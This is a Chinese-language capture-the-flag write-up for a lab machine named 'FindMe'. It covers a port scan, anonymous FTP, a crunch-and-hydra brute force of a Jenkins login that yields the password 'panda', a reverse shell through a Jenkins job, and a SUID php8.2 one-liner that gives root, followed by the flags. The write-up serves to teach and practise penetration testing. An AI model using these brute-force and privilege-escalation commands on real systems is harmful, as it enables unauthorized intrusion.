# FindMe

2025.03.05 https://thehackerslabs.com/find-me/

## Ip

192.168.5.40

## Scan

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

ftp 可匿名，读取 ayuda.txt , 提示用户名 geralt ，jenkins 的密码包含 5 个字符，以 p 开头，以 a 结尾。

访问 80web 上无信息，8080 web 显示 jenkins，根据上面提示生成密码，爆破：

```
crunch 5 5 -f /usr/share/crunch/charset.lst mixalpha-numeric -t p@@@a -o pass.txt

crunch 5 5 -t p@@@a -o pass.txt
hydra -l geralt -P pass 192.168.5.40 -s 8080 http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=:F=Invalid username or password" -f
hydra -l geralt -P pass 192.168.5.40 -s 8080 http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=:c=/login:Invalid username or password" -f
[8080][http-post-form] host: 192.168.5.40   login: geralt   password: panda
```

爆出密码 panda，登陆 jenkins。创建 item，执行反弹 shell 到 kali 上：

```
jenkins@find-me:~/workspace/shell$ id
id
uid=104(jenkins) gid=110(jenkins) grupos=110(jenkins)
```

发现 suid /usr/bin/php8.2

```
/usr/bin/php8.2 -r "posix_setuid(0); system('/bin/bash');"
```

直接拿到 root 权限，获得 flag：

```
root@find-me:/home/geralt# cat user.txt
be336806b564e9fd7812aef123f80b7b
root@find-me:/home/geralt# cat /root/root.txt
71b5a461e7df11a40f29c707a8b1b05f
```
